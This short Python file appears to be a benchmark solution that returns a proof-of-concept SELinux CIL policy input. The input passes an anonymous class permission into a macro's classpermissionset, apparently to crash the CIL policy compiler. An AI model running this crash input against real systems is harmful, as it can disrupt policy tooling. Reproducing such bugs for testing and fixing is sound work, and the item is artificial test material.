import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """
(macro m ((CP classpermission))
  (classpermissionset cps CP)
)
(call m ((CP (file (getattr)))))
"""
        return poc.encode()